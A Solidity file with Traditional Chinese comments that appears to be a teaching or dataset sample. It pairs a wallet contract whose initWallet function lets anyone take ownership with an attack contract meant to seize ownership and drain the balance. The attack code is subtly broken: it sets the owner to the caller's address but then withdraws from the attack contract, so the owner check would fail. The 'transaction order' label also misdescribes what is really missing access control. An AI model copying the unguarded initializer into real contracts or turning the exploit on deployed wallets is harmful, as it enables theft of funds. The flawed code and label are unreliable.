// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

/*
  漏洞名稱：Transfer Recipient Depending on Transaction Order
  漏洞描述：
    本範例中，initWallet 函數未加限制，攻擊者可以在同一區塊內呼叫 initWallet 改變 owner 變數，造成 withdraw 時轉帳對象不固定，可能會在轉帳事件前更改收款者地址，導致資金被竊取。
  攻擊步驟：
    1. 部署 OwnableWallet 合約。
    2. 呼叫 initWallet 設定初始 owner 為合法使用者（例如受害者）。
    3. 攻擊者在同一區塊內先呼叫 initWallet 將 owner 變更為攻擊者地址，再呼叫 withdraw 轉出全部 Ether 給攻擊者。
*/

contract OwnableWallet {
    // 漏洞重點：owner 狀態變數未受到適當保護，任意使用者皆可呼叫 initWallet 修改 owner
    address payable public owner;

    // initWallet 本應只在部署初期被呼叫，但未做權限檢查，容易被攻擊者濫用
    function initWallet(address payable _owner) public {
        owner = _owner; // 漏洞：此處未限制呼叫者，任意使用者可改變 owner
        // more setup...
    }

    // withdraw 函數只允許當前 owner 提款，且使用 owner 進行轉帳
    function withdraw(uint _amount) public {
        require(msg.sender == owner, "Only owner can withdraw");
        owner.transfer(_amount);
    }

    // 接收 Ether 的 fallback 函數
    receive() external payable {}
}

// 攻擊合約：利用交易排序漏洞，在同一區塊內先修改 owner 再提款
contract AttackContract {
    OwnableWallet public vulnerableWallet;

    constructor(address _vulnerableWallet) {
        vulnerableWallet = OwnableWallet(payable(_vulnerableWallet));
    }

    // 攻擊流程：
    // 1. 攻擊者呼叫 initWallet 改變 owner 為自己的地址
    // 2. 攻擊者立即呼叫 withdraw 提取全部 Ether
    function attack() public {
        // 步驟 1: 攻擊者修改 owner
        vulnerableWallet.initWallet(payable(msg.sender));

        // 步驟 2: 呼叫 withdraw 將合約內全部 Ether 轉帳到攻擊者地址
        vulnerableWallet.withdraw(address(vulnerableWallet).balance);
    }
}
